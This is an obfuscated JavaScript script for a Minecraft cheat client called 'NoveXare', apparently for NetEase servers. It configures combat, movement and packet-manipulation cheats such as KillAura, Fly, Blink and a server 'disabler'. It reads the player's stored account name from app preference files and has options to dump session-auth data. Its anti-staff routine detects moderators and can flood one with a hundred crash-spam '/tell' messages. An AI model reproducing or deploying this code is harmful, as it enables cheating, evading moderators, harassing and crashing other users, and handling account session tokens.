var Spammer_num = 1;
var text_d_2 = -Infinity;
var text_d_1 = 0;
var bed_list = [];
var surround_all = true;
var body_rot_speed = 5;
var head_rot_speed = 5;
var head_rot = false;
var body_rot = false;
var lock_head = false;
var random_num = 0;
var random_delay = 0;
var random_rot = false;
var regex_enable = true;
var rush_length = 5;
var bjd_jump = false;
var up_down_speed = 1;
var max_mot_y = 0.42;
var build_distance = 4;
var build_tick = 10;
var build_t = 0;
var build_list = [];
var build_success = true;
var save_to_file = false;
var move_fly = false;
var FightBot_imitateMove = false;
var gm_y = 0;
var gm_cycle = 1;
var gm_delay = 0;
var gm_xz = false;
var gm_edit_y = true;
var gm_count = 5;
func_mode.GodMode_mode = 0;
var rocker_speed = 8;
var rocker_bhop = false;
var rocker_ahop = false;
var imitateMove = false;
func_mode.rocker_mode = 0;
func_mode.move_mode = 0;
func_mode.LookTP_mode = 0;
func_mode.surround_mode = 0;
var use_times = 1;
var select_t = 0;
var break_bed = true;
var break_chest = true;
var through_wall = true;
var autosave_fake_block = false;
var autosave_near_block = false;
var autosave_air = false;
var autosave_autoselect = false;
var attack_particle_size = 20;
var particle_size = 1;
var attack_particle_type = 3;
var surround_particle_type = 19;
var surround_particle_size = 1;
func_mode.freecam_mode = 0;
var only_walk = 0;
var destroy_size = 1;
var SelectBomb = false;
var SelectCrystal = false;
var excludeFeet = false;
var death_pos = {};
var show_cps = true;
var isBedbuild = false;
var bomb_delay = 1;
var crystal_delay = 1;
var crystal_acount = 1;
var bow_speed = 0.5;
var CrystalAura_distance = 3;
var arrow_particle_type = 12;
var drop_motion = 1.3;
var CrystalTP = false;
func_mode.avoid_mode = 0;
var avoid_distance = 5;
var current_mine_num = 0;
var mine_num = 20;
var mine_distance = 5;
var steal_delay = 0.5;
var click_mode = false;
var InfiniteAura_click = true;
var InfiniteAura_backclick = true;
var InfiniteAura_yoffset = 0;
var FightBot_distance = 4;
var FightBot_speed = 5;
var FightBot_pot_health = 0;
var FightBot_jump = false;
var FightBot_KillAura = true;
var FightBot_aimbot = false;
var FightBot_KeepDistance = false;
var FightBot_combo = false;
var FightBot_height = 0.42;
var FightBot_Scaffold = false;
var FightBot_autochest = false;
var attack_sound_type = 81;
var SoundPlayer_type = 81;
var attack_sound_level = 0;
var SoundPlayer_level = 0;
var FightBot_jump_rate = 33;
var FightBot_move_rate = 33;
var FightBot_fishhook_rate = 0;
var FightBot_snowball_rate = 0;
var FightBot_random_jump = false;
var FightBot_random_move = false;
var reverse_lag = false;
var back_select = false;
var attack_tick = 0;
var attack_ticks = 0;
var isAttacking = false;
var attack_frequency = 0;
var custom_time = 25;
var real_attack = 0;
var last_attack_target = null;
var show_real_cps = false;
var reverse_target = false;
var jump_strength = 42;
var cleaner_slot = 35;
var AntiKB_resistance_h = 100;
var AntiKB_resistance_v = 100;
var throwable_particle_gravity = 20;
var throwable_particle_speed = 100;
var throwable_particle_length = 200;
var throwable_particle_type = 55;
var throwable_particle_offset = 20;
var throwable_particle_target = true;
var throwable_particle_density = 10;
func_mode.throwable_particle_mode = 0;
var low_health_operate_sword = false;
var check_wall = false;
var check_ground = false;
var check_name = true;
var selectitems = [];
var select_hotbar_slots = [];
var select_use = false;
var select_delay = 0;
var last_tick_item = {};
var FightBot_autoweapon = false;
var fps_rate = 10;
var freecam_show = false;
var freecam_dis = false;
var targetStrafe = false;
var targetStrafe_distance = 1.5;
var rocker_func = {};
var airjump_func = {};
var flexibleMove_speed = 5;
var targetStrafe_relative = true;
var destroy_up = false;
var destroy_playeraction = false;
var destroy_authinput = false;
var destroy_packet = false;
var targetStrafe_range = 180;
func_mode.AntiStaff_mode = 0;
func_mode.anti_mode = 0;
func_mode.fakeTip_mode = 0;
var current_poem = "";
var remark_hex = false;
var AntiStaff_ground = false;
var AntiStaff_Invisible = false;
var tip_t1 = 201;
var BalanceTimer_t = 0;
var BalanceTimer_st = false;
var calculate_t = 0;
var variable_player = false;
var variable_entity = false;
var variable_id = false;
var edit_KickAura = "";
var KickAura_repeat = 50;
var swing_speed = 17;
func_mode.set_time = 0;
var switch_delay = 0;
var switch_delay_t = 0;
var isBinding = null;
var cleaner_bow = false;
var cleaner_chest = false;
var da_bow = false;
var da_chest = false;
var action_times = 1;
var edit_action_id = 0;
var action_ticks = 0;
var action_tick = 0;
var use_action_config = false;
var tower_continuously = true;
var tower_delay = 10;
var ChestAura_length = 3;
var teams_name = true;
var teams_armor = false;
var team_slot = 0;
var te_all = false;
var te_two = false;
var first_target = null;
var BypassMute = false;
var FuncMessage = true;
var KillAura = false;
var auto_target = true;
var FuncTip = true;
var Bhop = false;
var Velocity = false;
var AutoDo = false;
var ClickTarget = false;
var ClickWhiteList = false;
var AutoClick = false;
var NoLiquid = false;
var ShowTargetList = false;
var Rider = false;
var ShowInfo = true;
var show_pos = false;
var show_item = false;
var show_speed = false;
var Jesus = false;
var lock_target = false;
var Teams = false;
var AssistAim = false;
var click_team = false;
var LockBehind = false;
var Surround = false;
var JetPack = false;
var Trace = false;
var Suspend = false;
var InfiniteAura = false;
var GodMode = false;
var Fly = false;
var SafeWalk = false;
var KillMessage = false;
var Sucker = false;
var Scaffold = false;
var SlowDown = false;
var AirJump = false;
var KeepDistance = false;
var Crasher = false;
var HitBox = false;
var disabler = false;
var Cleaner = false;
var LongJump = false;
var AntiVoid = false;
var CustomKB = false;
var SmartWeapon = false;
var PyRpcManager = false;
var Spammer = false;
var Derp = false;
var AttackSelf = false;
var RandomLock = false;
var ResShop = false;
var AntiTouch = false;
var AutoSave = false;
var AutoSaveCfg = false;
var AutoLoadCfg = false;
var FastBuild = false;
var RecordInfo = false;
var NoFall = false;
var Rocker = false;
var ShowHurt = true;
var Breaker = false;
var BlockIn = false;
var FreeCam = false;
var auto_bed = false;
var TargetParticle = false;
var SurroundParticle = false;
var BetterJump = false;
var ClickDestroy = false;
var AutoDestroy = false;
var AutoCrystal = false;
var AutoBomb = false;
var RemoveItem = false;
var AvoidAttack = false;
var AttackRender = false;
var ArrowTracer = false;
var ArrowFly = false;
var ArrowView = false;
var CrystalAura = false;
var ArrowParticle = false;
var RemoveNotPlayer = false;
var RemovePlayer = false;
var FarmAura = false;
var DropRes = false;
var PlayerAuthInputPacket = false;
var PVPDaLao = false;
var ActivitySender = false;
var ShowClickBlock = false;
var SmartInv = false;
var AttackAim = false;
var FakeLag = false;
var FakeWater = false;
var lag_tick = 10;
var DeathInfo = false;
var LocalRespawn = false;
var AttackParticle = false;
var AutoVoid = false;
var Tower = false;
var Hover = false;
var ChestAura = false;
var ShowPressKey = false;
var ShowUpliftKey = false;
var ShowClientMessage = false;
var ShowUI = false;
var ShowCommand = false;
var ShowSendCommand = false;
var show_target_dis = false;
var show_player_list = false;
var WorldPlayerInfo = false;
var show_time = true;
var show_kill_num = false;
var TargetHealth = false;
var show_attack_rate = false;
var show_ping = false;
var show_detail_item = false;
var show_self_health = false;
var RainbowTip = false;
var RandomDrop = false;
var RandomSelect = false;
var OtherUser = false;
var avoid_throw = false;
var Miner = false;
var ChestSteal = false;
var Criticals = false;
var FightBot = false;
var AttackSound = false;
var SoundPlayer = false;
var InteractAura = false;
var ChargeAura = false;
var FPSReducer = false;
var ChatManager = false;
var AvoidInvalid = false;
var RightClicker = false;
var ClickGround = false;
var CheckAxe = false;
var NoPacket = false;
var Blink = false;
var NoAnyReceive = false;
var auto_jump = false;
var AntiKB = false;
var TrajectoryRender = false;
var KickAura = false;
var HotbarSelector = false;
var AutoSelect = false;
var AutoArmor = false;
var AutoGG = false;
var LineParticle = false;
var AutoBuy = false;
var FlexibleMove = false;
var AntiStaff = false;
var FakeBuilder = false;
var ClickBlock = false;
var FakeTip = false;
var FakeWhisper = false;
var FakeChat = false;
var BalanceTimer = false;
var ShowVariable = false;
var ShowDestroyBlock = false;
var ClickTP = false;
var NightVision = false;
var ModifySwing = false;
var ModifyTime = false;
var ShowGameInfo = false;
var ShowEntityAnime = false;
var ChunkRender = false;
var ChatSuffix = false;
var FakeMove = false;
var AutoShifter = false;
var ActionManager = false;
var FunnyKill = false;
var LockPerson = false;
var NoDebuff = false;
var ShortList = false;
var EatInstantly = false;
var getDelay = true;
var MoveJump = false;
var SafeAttack = false;
var FastStop = false;
var HurtJump = false;
var FakeSprint = false;
var GetCommand = false;
var ShowReceivePacket = false;
var ShowSendPacket = false;
var ArrayList = true;
var NoCamShake = false;
var DumpResponseSauth = false;
var DumpRequestSauth = false;
var AutoPot = false;
var SpinAttack = false;
var NoWall = false;
var BypassServer = false;
var TargetEdit = false;
var InfinityExp = false;
var NoHunger = false;
var CameraManager = false;
var max_damage = 0;
var ArrowView_x = 10;
var ArrowView_z = 10;
var ArrowView_y = 10;
var Arrow_id = null;
var cm_x = 20;
var cm_y = 20;
var cm_z = 20;
var cm_pitch = 90;
var cm_anchor_y = 15;
var cm_roll = 0;
var cm_moverange = 5;
var anchor_target = self_id;
var cm_editanchor = false;
var cm_actioncamera = false;
var cm_follow = false;
var ArrowList = [];
var max_armor = [];
var nomove_pos = {};
var ping = 0;
var ping_1 = 0;
var ping_2 = 0;
var StartArmor = false;
var SafeAttack_fov = 50;
var derp_p_r = 90;
var derp_y_r = -180;
var self_can_see = false;
var other_can_see = false;
var TestModule = false;
var mini_tick = 0;
var mini_close = 1;
var mini_delay = 0;
var mini_kills = 0;
var ac_min_cps = 10;
var ac_only_aimed = false;
var ac_aim_fov = 15;
var ac_max_cps = 10;
var ac_t_1 = 0;
var ac_t_2 = -Infinity;
var getSelf = 20;
var attack_list = [];
var breaker_auto = false;
var breaker_range = 5;
var enable_bypass = false;
var enable_disabler = false;
var autobreak = false;
var ignoreReceivePacket = false;
var showReceiveID = true;
var showSendID = true;
var showReceiveName = true;
var showSendName = true;
var saveReceivePacket = false;
var saveSendPacket = false;
var interceptReceivePacket = false;
var ignoreSendPacket = false;
var interceptSendPacket = false;
var statisticsSendPacket = false;
var statisticsReceivePacket = false;
var cleaner_move = false;
var da_move = false;
var da_change = false;
var cleaner_change = false;
var record_sauth = false;
var Sauths = getData("sauths", "");
const username = getData("NoveXare_User", "Null");
const pwd = getData("NoveXare_Pwd", "Null");
const file = read_file("/data/data/top.bienvenido.saas.i18n/app_split/com.netease.x19/0/shared_prefs/com.mojang.minecraftpe.MainActivity.xml");
const file2 = read_file("/data/data/com.netease.x19/shared_prefs/com.mojang.minecraftpe.MainActivity.xml");
function testText(_0x4c939d, _0x58bea1, _0x39b5b4) {
  let _0x204a4c = _0x4c939d.indexOf(_0x58bea1) + _0x58bea1.length;
  let _0x2fbd6d = _0x4c939d.indexOf(_0x39b5b4, _0x204a4c);
  return _0x4c939d.substring(_0x204a4c, _0x2fbd6d);
}
const account = testText(file == "" ? file2 : file, "username\">", "</string>");
function onTickEvent() {
  try {
    if (disabler) {
      return;
    }
    var _0x2aa3e0 = [];
    self_id = getUserID(other_user);
    self_pos = getEntityPos(self_id);
    const _0x3ba0a3 = getEntityAttribute(self_id, "minecraft:health");
    var _0x16a344 = getEntityMotion(self_id);
    if (FastStop && !getEntityFlag(self_id, 34)) {
      setMotion(0, _0x16a344.y, 0);
    }
    var _0x412945 = getEntityRot();
    var _0x323bde = getDistance(self_pos, last_tick_pos) / 0.05;
    var _0x162843 = getHorizontalDistance(self_pos, last_tick_pos) / 0.05;
    var _0x351e65 = getSpeed(self_id);
    var _0x423186 = getPlayerBlockPos(self_id);
    var _0x4f7660 = getCarried(self_id);
    var _0x5ed6d7 = getWorldPlayerList();
    var _0x58cd3a = getEntityIsGround(self_id);
    if (TestModule) {
      setEntityName(self_id, "***");
    }
    if (calculate_t > getSelf) {
      if (AutoBuy && AutoBuy_sword || SmartInv) {
        max_damage = getEntityMaxDamage(self_id);
      }
      if (SmartInv) {
        max_armor = [getEntityMaxArmor(self_id, "helmet"), getEntityMaxArmor(self_id, "chestplate"), getEntityMaxArmor(self_id, "leggings"), getEntityMaxArmor(self_id, "boots")];
      }
      if (getDelay) {
        ping_1 = Date.now();
        curl_get("https://www.baidu.com", {}, (_0x163ed2, _0x561e2d) => globalThis.ping_2 = Date.now());
        ping = Math.abs(ping_2 - ping_1);
      }
      item_count = getPlayerItemCount(self_id);
      calculate_t = 0;
    }
    if (_0x3ba0a3.current - last_tick_heal > 10) {
      if (DeathInfo) {
        clientMessage("§3§l[NoveXare] §r§7>>> §rTip §7>>>§r You are Dead - DeathPos: " + Math.round(death_pos.x) + ", " + Math.round(death_pos.y) + ", " + Math.round(death_pos.z));
      }
      if (LocalRespawn) {
        setPos(death_pos.x, death_pos.y, death_pos.z);
      }
      if (LocalRespawn) {
        setMotion(0, 0, 0);
      }
    } else if (_0x3ba0a3.current < last_tick_heal) {
      death_pos = self_pos;
    }
    if (SpinAttack) {
      setEntityFlag(self_id, 56, true);
    }
    if (EatInstantly && getEntityFlag(self_id, 4)) {
      setTimeout(() => dropPlayerInventorySlot(self_id, getPlayerSelectItemSlot(self_id)), 201);
    }
    if (NoWall) {
      setEntityFlag(self_id, 48, false);
    }
    if (AutoClick && ac_t_1 - ac_t_2 >= 0) {
      let _0x3d24fe = getRandomNum(ac_min_cps, ac_max_cps);
      let _0x550ae4 = Math.round(1000 / _0x3d24fe);
      const _0x30c5cc = getEntityList().some(_0x39f21f => isAimed(self_id, _0x39f21f, ac_aim_fov, 0)) || !ac_only_aimed;
      if (_0x30c5cc) {
        simulateClick();
      }
      ac_t_2 = ac_t_1 + _0x550ae4;
    }
    ac_t_1 = Date.now();
    if (FakeSprint) {
      setEntityFlag(self_id, 3, true);
    }
    if (CameraManager) {
      const _0x40c1dc = getEntityPos(anchor_target);
      if (cm_roll > 0) {
        setCameraRotation(90, 0, cm_roll);
      }
      if (!cm_actioncamera) {
        if (anchor_target == self_id) {
          setCameraAnchor(0, (cm_anchor_y - 15) / 5, 0);
        } else {
          setCameraAnchor(_0x40c1dc.x - self_pos.x, _0x40c1dc.y - self_pos.y, -_0x40c1dc.z + self_pos.z);
          const _0x1fbfd5 = getEntityRot(anchor_target);
          if (cm_follow) {
            setCameraRotation(_0x1fbfd5.pitch, _0x1fbfd5.yaw, 0);
          }
        }
      } else {
        setCameraAnchor(-_0x16a344.x * cm_moverange, -_0x16a344.y * cm_moverange, -_0x16a344.z * cm_moverange);
      }
      setCameraOffset((cm_x - 20) / 5, (cm_y - 20) / 5, (cm_z - 20) / 5);
      setCameraPitchLimit(-cm_pitch, cm_pitch);
    }
    if (_0x3ba0a3.current < last_tick_heal) {
      last_tick_heal = _0x3ba0a3.current;
    }
    if (NoDebuff) {
      debuff.map(_0x25f741 => removeEntityEffect(self_id, _0x25f741));
    }
    if (MoveJump && getEntityFlag(self_id, 34) && _0x58cd3a) {
      playerJump();
    }
    if (ChunkRender) {
      var _0x30da60 = {};
      _0x30da60.x = Math.floor(self_pos.x / 16);
      _0x30da60.z = Math.floor(self_pos.z / 16);
      let _0xb7147 = _0x30da60;
      var _0x3047ce = {
        x: _0xb7147.x * 16,
        z: _0xb7147.z * 16
      };
      let _0x48201c = _0x3047ce;
      var _0x1bebbc = {
        x: (_0xb7147.x + 1) * 16,
        z: (_0xb7147.z + 1) * 16
      };
      let _0x156537 = _0x1bebbc;
      for (let _0x15a765 = 0; _0x15a765 < 16; _0x15a765++) {
        drawParticle(55, _0x48201c.x + _0x15a765, self_pos.y, _0x48201c.z, 1);
      }
      for (let _0x1eb369 = 0; _0x1eb369 < 16; _0x1eb369++) {
        drawParticle(55, _0x48201c.x, self_pos.y, _0x48201c.z + _0x1eb369, 1);
      }
      for (let _0x15b139 = 0; _0x15b139 < 16; _0x15b139++) {
        drawParticle(55, _0x156537.x - _0x15b139, self_pos.y, _0x156537.z, 1);
      }
      for (let _0x4f2d5a = 0; _0x4f2d5a < 16; _0x4f2d5a++) {
        drawParticle(55, _0x156537.x, self_pos.y, _0x156537.z - _0x4f2d5a, 1);
      }
      _0x2aa3e0.push("§rTip §7>>> " + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + "区块坐标: " + _0xb7147.x + "， " + _0xb7147.z);
    }
    if (auto_target && (!lock_target || !findEntity(target_list[0])) && switch_delay_t > switch_delay) {
      target_list = getTargets(self_id, max_distance, max_target_num);
      switch_delay_t = 0;
    }
    if (AutoGG) {
      for (let _0x50e38e of again_item) {
        if (func_mode.gg_mode == 0) {
          dropPlayerInventorySlot(self_id, getItem(self_id, _0x50e38e, -1, "一局"));
        }
        if (func_mode.gg_mode == 1) {
          selectPlayerInventorySlot(self_id, getItem(self_id, _0x50e38e, -1, "一局"));
          const _0x58181c = getCarried(self_id);
          if (_0x58181c.name.includes("一局")) {
            useItem();
          }
        }
      }
    }
    if (ClickGround) {
      buildBlock(self_id, _0x423186.x, _0x423186.y - 1, _0x423186.z, 1);
    }
    if (AutoBuy && tickCounter > 10) {
      var _0x326eae = {};
      _0x326eae.gold = getItemCount(-1, "minecraft:gold_ingot");
      _0x326eae.iron = getItemCount(-1, "minecraft:iron_ingot");
      _0x326eae.diamond = getItemCount(-1, "minecraft:diamond");
      _0x326eae.emerald = getItemCount(-1, "minecraft:emerald");
      _0x326eae.star = getItemCount(-1, "minecraft:nether_star");
      var _0x27a8d5 = _0x326eae;
      const _0xf0e0fd = (_0x47719c, _0x145d3e, _0xf8a7b5) => {
        if (_0x47719c != []) {
          HYTShopMod(..._0x47719c);
        }
        if (_0x145d3e != []) {
          BJD_NBedwarsBuyItemEvent(..._0x145d3e);
        }
        if (FuncTip) {
          clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>> " + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + _0xf8a7b5);
        }
      };
      if (AutoBuy_sword) {
        if (max_damage < 8 && _0x27a8d5.diamond > 6) {
          _0xf0e0fd(["2", "3"], [], "自动购买钻石剑");
          max_damage = getEntityMaxDamage(self_id);
        }
        if (max_damage < 8 && _0x27a8d5.emerald > 6) {
          _0xf0e0fd([], ["剑", 2], "自动购买钻石剑");
          max_damage = getEntityMaxDamage(self_id);
        }
        if (max_damage < 7 && _0x27a8d5.gold > 7) {
          _0xf0e0fd(["2", "2"], ["剑", 1], "自动购买铁剑");
          max_damage = getEntityMaxDamage(self_id);
        }
        if (max_damage < 5 && _0x27a8d5.iron > 10) {
          _0xf0e0fd(["2", "1"], ["剑", 0], "自动购买石剑");
          max_damage = getEntityMaxDamage(self_id);
        }
      }
      if (AutoBuy_block && getItemCount(-1, "wool") < AutoBuy_block_count * 16 && _0x27a8d5.iron > 4) {
        _0xf0e0fd(["1", "1"], ["方块", 0], "自动购买方块");
      }
      if (AutoBuy_apple && _0x27a8d5.gold > 3 && getItemCount(-1, "minecraft:golden_apple") < AutoBuy_apple_count) {
        _0xf0e0fd(["7", "5"], ["特殊物品", 0], "自动购买金苹果");
      }
      if (AutoBuy_armor) {
        if (hasBrought.armor <= 2 && _0x27a8d5.diamond > 8) {
          _0xf0e0fd(["3", "3"], [], "自动购买钻套");
          hasBrought.armor = 3;
        }
        if (hasBrought.armor <= 1 && _0x27a8d5.emerald > 6) {
          _0xf0e0fd([], ["护甲", 2], "自动购买钻套");
          hasBrought.armor = 2;
        }
        if (hasBrought.armor <= 1 && _0x27a8d5.gold > 12) {
          _0xf0e0fd(["3", "2"], ["护甲", 1], "自动购买铁套");
          hasBrought.armor = 2;
        }
        if (hasBrought.armor <= 0 && _0x27a8d5.iron > 35) {
          _0xf0e0fd(["3", "1"], [], "自动购买锁链套");
          hasBrought.armor = 1;
        }
        if (hasBrought.armor <= 0 && _0x27a8d5.iron > 24) {
          _0xf0e0fd([], ["护甲", 0], "自动购买锁链套");
          hasBrought.armor = 1;
        }
      }
      if (AutoBuy_enchant) {
        if (hasBrought.enchant.sharp <= 1 && _0x27a8d5.star > 10) {
          _0xf0e0fd(["8", "1"], [], "自动升级锋利2");
          hasBrought.enchant.sharp = 2;
        } else if (hasBrought.enchant.protect <= 1 && _0x27a8d5.star > 10) {
          _0xf0e0fd(["8", "2"], [], "自动升级保护2");
          hasBrought.enchant.protect = 2;
        } else if (hasBrought.enchant.sharp <= 0 && _0x27a8d5.star > 6) {
          _0xf0e0fd(["8", "1"], [], "自动升级锋利1");
          hasBrought.enchant.sharp = 1;
        } else if (hasBrought.enchant.protect <= 0 && _0x27a8d5.star > 6) {
          _0xf0e0fd(["8", "2"], [], "自动升级保护1");
          hasBrought.enchant.protect = 1;
        }
      }
      tickCounter = 0;
    }
    if (goto_pos != null) {
      const _0x1ff938 = getHorizontalDistance(self_pos, goto_pos);
      const _0x3d1e9c = getDistance(self_pos, goto_pos);
      if (_0x3d1e9c >= 5) {
        if (_0x1ff938 >= 1) {
          let _0xccc462 = getPlayerAngle(self_id, goto_pos, "yaw_pos");
          var _0x13b8bc = {
            yaw: _0xccc462,
            pitch: 0
          };
          let _0x142d84 = getDisplacement(-default_speed / 10, self_pos, _0x13b8bc);
          setMotion(_0x142d84.x - self_pos.x, self_pos.y, _0x142d84.z - self_pos.z);
        } else {
          let _0x287c33 = -getPlayerAngle(self_id, goto_pos, "pitch_pos");
          var _0xf1ff2 = {
            yaw: 0,
            pitch: _0x287c33
          };
          let _0x1e2b8d = getDisplacement(default_speed * -2 / 10, self_pos, _0xf1ff2);
          setMotion(self_pos.x, _0x1e2b8d.y - self_pos.y, self_pos.z);
        }
      } else {
        goto_pos = null;
        if (FuncTip) {
          clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>> " + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + "已设置到达目的地");
        }
      }
    }
    if (ChestAura) {
      const _0x124cac = getPlayerBlockPos(self_id);
      const _0x3e7bed = Math.round(ChestAura_length);
      _0x3c6a2e: for (let _0x2ab4af = -_0x3e7bed; _0x2ab4af < _0x3e7bed; _0x2ab4af++) {
        for (let _0x4fa1fd = -_0x3e7bed; _0x4fa1fd < _0x3e7bed; _0x4fa1fd++) {
          for (let _0x449677 = -_0x3e7bed; _0x449677 < _0x3e7bed; _0x449677++) {
            const _0x447057 = getBlock(_0x124cac.x + _0x2ab4af, _0x124cac.y + _0x4fa1fd, _0x124cac.z + _0x449677);
            const _0x429c16 = obj2str([_0x124cac.x + _0x2ab4af, _0x124cac.y + _0x4fa1fd, _0x124cac.z + _0x449677]);
            if (_0x447057.namespace == "minecraft:chest" && !chest_pos.includes(_0x429c16) && !isOpenChest) {
              buildBlock(self_id, _0x124cac.x + _0x2ab4af, _0x124cac.y + _0x4fa1fd, _0x124cac.z + _0x449677, 0);
              chest_pos.push(_0x429c16);
            } else {
              break _0x3c6a2e;
            }
          }
        }
      }
    }
    if (AntiStaff) {
      _0x5ed6d7.map(_0x274981 => {
        const {
          name,
          id
        } = _0x274981;
        if (id != self_id && name != "" && hasItem(self_id, "sword")) {
          let _0x3a0489 = null;
          if (func_mode.AntiStaff_mode == 0 && (!name.includes("§") || !name.includes("[") || !name.includes("]")) && !name.includes("锭") && !name == "村民") {
            _0x3a0489 = id;
          }
          if (func_mode.AntiStaff_mode == 1 && (name.includes("管") && name.includes("理") && name.includes("员") || name.includes("管理员"))) {
            _0x3a0489 = id;
          }
          if (func_mode.AntiStaff_mode == 2) {
            const _0x459b72 = JSON.parse(readFile(NoveXare_path + "/Staff.json"));
            _0x459b72.map(_0x18cf56 => {
              if (_0x18cf56.match_mode == "精准" && _0x18cf56.has_mode == "存在" && _0x18cf56.texts.some(_0xdc0665 => name == _0xdc0665) != _0x18cf56.reverse_selection) {
                _0x3a0489 = id;
              }
              if (_0x18cf56.match_mode == "精准" && _0x18cf56.has_mode == "同时" && _0x18cf56.texts.every(_0x2cd533 => name == _0x2cd533) != _0x18cf56.reverse_selection) {
                _0x3a0489 = id;
              }
              if (_0x18cf56.match_mode == "模糊" && _0x18cf56.has_mode == "存在" && _0x18cf56.texts.some(_0x40c3b9 => name.includes(_0x40c3b9)) != _0x18cf56.reverse_selection) {
                _0x3a0489 = id;
              }
              if (_0x18cf56.match_mode == "精准" && _0x18cf56.has_mode == "存在" && _0x18cf56.texts.every(_0xe41f50 => name.includes(_0xe41f50)) != _0x18cf56.reverse_selection) {
                _0x3a0489 = id;
              }
            });
          }
          if (func_mode.AntiStaff_mode == 3) {
            _0x3a0489 = id;
          }
          if (AntiStaff_Invisible && !getEntityFlag(id, 5)) {
            _0x3a0489 = null;
          }
          if (AntiStaff_ground && getEntityIsGround(id)) {
            _0x3a0489 = null;
          }
          if (_0x3a0489 != null) {
            if (func_mode.anti_mode == 0) {
              clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §7>>> " + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + "可能存在协管: " + name);
            } else if (func_mode.anti_mode == 1) {
              executeCommand("/hub");
            } else if (func_mode.anti_mode == 2) {
              executeCommand("/again");
            } else if (func_mode.anti_mode == 3) {
              _0x2aa3e0.push("Tip §7>>> " + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + "可能存在协管: " + name);
            } else if (func_mode.anti_mode == 4) {
              let _0x40f7c6 = name.indexOf("]") - 2;
              let _0x201906 = ["b", "c", "e", "a"];
              for (let _0x1280af of _0x201906) {
                if (name.indexOf("·§" + _0x1280af) != -1) {
                  _0x40f7c6 = name.indexOf("·§" + _0x1280af);
                  break;
                }
              }
              var _0x16158e = _0x40f7c6 == -1 ? name : name.slice(_0x40f7c6 + 3, name.length);
              if (_0x16158e.includes("【") && _0x16158e.includes("】")) {
                _0x16158e = getText(_0x16158e, "【", "】");
              }
              for (let _0x42c176 = 0; _0x42c176 < 100; _0x42c176++) {
                executeCommand("/tell \"" + _0x16158e + "\" NoveXareCrasher".repeat(50));
              }
            }
          }
        }
      });
    }
    if (InteractAura) {
      target_list.map(_0x5a1514 => interactEntity(_0x5a1514));
    }
    if (NoHunger) {
      setEntityAttribute(getLocalPlayerUniqueID(), "minecraft:player.level", {
        current: 32767
      });
    }
    if (NoHunger) {
      setEntityAttribute(getLocalPlayerUniqueID(), "minecraft:player.hunger", {
        current: 20
      });
    }
    if (LockPerson) {
      setPlayerViewPerspective(func_mode.person_mode);
    }
    if (Tower && (_0x412945.pitch < -80 || _0x412945.pitch > 80) && _0x4f7660.isBlock) {
      if (_0x58cd3a || tower_continuously) {
        setTimeout(() => playerJump(), tower_delay * 50);
        Click(_0x423186.x, _0x423186.y - 1, _0x423186.z);
      }
    }
    if (ShowVariable) {
      if (variable_player && last_world_player.length != _0x5ed6d7.length) {
        clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §7>>> " + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + "玩家数量发生变化 " + last_world_player.length + " => " + _0x5ed6d7.length);
        last_world_player = _0x5ed6d7;
      }
      if (variable_id && self_id != last_tick_id) {
        clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §7>>> " + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + "玩家本地ID发生变化 " + last_tick_id + " => " + self_id);
      }
    }
    if (CheckAxe) {
      var _0x36e99f = [];
      _0x5ed6d7.map(_0x4254bb => {
        if (getEntityMaxDamage(_0x4254bb.id) > 20) {
          _0x36e99f.push(getEntityName(_0x4254bb.id));
        }
      });
      if (_0x36e99f.length > 0) {
        _0x2aa3e0.push("§rTip §7>>> " + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + "下列玩家背包存在秒人斧:" + obj2str(_0x36e99f));
      }
    }
    if (WorldPlayerInfo && last_world_player.length != _0x5ed6d7.length) {
      const _0x4b32bd = _0x5ed6d7.map(_0x10123e => _0x10123e.name);
      let _0x5bb8e9 = subtraction(last_world_player, _0x4b32bd);
      let _0x25f34b = last_world_player.length < _0x4b32bd.length;
      if (_0x25f34b) {
        clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §7>>> " + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + obj2str(_0x5bb8e9) + "进入了世界");
      } else {
        clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §7>>> " + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + obj2str(_0x5bb8e9) + "离开了世界");
      }
      last_world_player = _0x4b32bd;
    }
    if (DropRes && _0x16a344.y < -drop_motion) {
      for (index = 0; index < 36; index++) {
        const _0x6dfc85 = getInventory(self_id, index);
        if (resList.includes(_0x6dfc85.namespace)) {
          dropPlayerInventorySlot(self_id, index);
        }
      }
    }
    if (AttackAim) {
      if (aim_t1 - aim_t0 > Math.round(1000 / aim_attack_cps) - 50) {
        target_list.map(_0x5836b9 => {
          if (isAimed(self_id, _0x5836b9, aim_attack_fov, 0)) {
            if (aim_attack_use) {
              useItem();
            } else {
              attack(_0x5836b9, AttackSwing);
            }
          }
        });
        aim_t0 = aim_t1;
      }
      aim_t1 = Date.now();
    }
    if (HotbarSelector) {
      let _0x10d91f = getInventory(self_id, select_slot);
      if (select_hotbar_slots.length > 0) {
        if (select_hotbar_slots.includes(select_slot + "")) {
          selectPlayerInventorySlot(self_id, select_slot);
        }
      } else if (selectitems.includes(_0x10d91f.name) || selectitems.includes(_0x10d91f.namespace) || selectitems.length == 0) {
        selectPlayerInventorySlot(self_id, select_slot);
        const _0x2b9e5d = getCarried(self_id);
        if (select_use && !_0x2b9e5d.namespace.includes("air")) {
          useItem();
        }
      }
    }
    if (AutoPot) {
      const _0x3981f3 = hasItem(self_id, "minecraft:splash_potion");
      if (ap_autobag && !_0x3981f3) {
        openInventory();
      }
      if (!_0x3981f3) {
        for (let _0x36ad49 = 35; _0x36ad49 > 8; _0x36ad49--) {
          const _0xa51ce8 = getInventory(self_id, _0x36ad49);
          if (!_0xa51ce8.namespace == "minecraft:splash_potion") {
            continue;
          }
          _0x3f5873: for (let _0x4e144e = 8; _0x4e144e > -1; _0x4e144e--) {
            const _0x420bdb = getInventory(self_id, _0x4e144e);
